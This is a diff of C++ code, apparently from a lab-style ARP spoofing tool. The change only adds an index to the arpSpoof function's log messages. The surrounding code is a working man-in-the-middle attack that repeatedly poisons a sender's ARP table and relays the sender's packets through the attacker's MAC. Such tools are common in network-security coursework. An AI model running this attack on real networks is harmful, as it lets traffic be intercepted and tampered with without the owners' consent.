@@ -68,16 +68,16 @@ void getMACAddress(pcap_t* handle, Mac& senderMac, Ip& senderIp, Mac& attackerMa
     }
 }
 
-void arpSpoof(pcap_t* handle, Mac senderMac, Mac attackerMac, Mac targetMac, Ip targetIp, Ip senderIp) {
+void arpSpoof(int i, pcap_t* handle, Mac senderMac, Mac attackerMac, Mac targetMac, Ip targetIp, Ip senderIp) {
 	// Create Child Process to Continuously Infect ARP Table of Sender
 	pid_t pid = fork();
 	if (pid <0) {
-		cout << "Fork Failed!\n";
+		cout << "Fork Failed! (" << i << ")\n";
 		return;
 	}
 	else if (pid == 0) {
 		while(true) { 
-			cout << "Infecting Sender's ARP Table\n";
+			cout <<"["<< i << "] Infecting Sender's ARP Table\n";
 			sendARPPacket(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
 			sleep(30);
 		}
@@ -105,7 +105,7 @@ void arpSpoof(pcap_t* handle, Mac senderMac, Mac attackerMac, Mac targetMac, Ip 
 			if (ethHdr->type() == EthHdr::Arp) {
 				ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
 				if (arpHdr->op() == ArpHdr::Request && arpHdr -> tip() == targetIp) {
-					cout << "Recieved ARP Request. Infecting Sender's ARP Table...\n";
+					cout <<"["<< i << "] Recieved ARP Request. Infecting Sender's ARP Table...\n";
 					sendARPPacket(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
 				}
 			} 
@@ -114,7 +114,7 @@ void arpSpoof(pcap_t* handle, Mac senderMac, Mac attackerMac, Mac targetMac, Ip 
 			else if (ethHdr->type() == EthHdr::Ip4 ) {
 				struct IPv4Hdr* ipHdr = (struct IPv4Hdr*)(packet + sizeof(EthHdr));
 				if (ntohl(ipHdr->ip_src) == senderIp ) {
-					cout << "Relaying Packet to Target...\n";
+					cout <<"["<< i << "] Relaying Packet to Target...\n";
 					ethHdr -> smac_ = attackerMac;
 					ethHdr -> dmac_ = targetMac;
 					
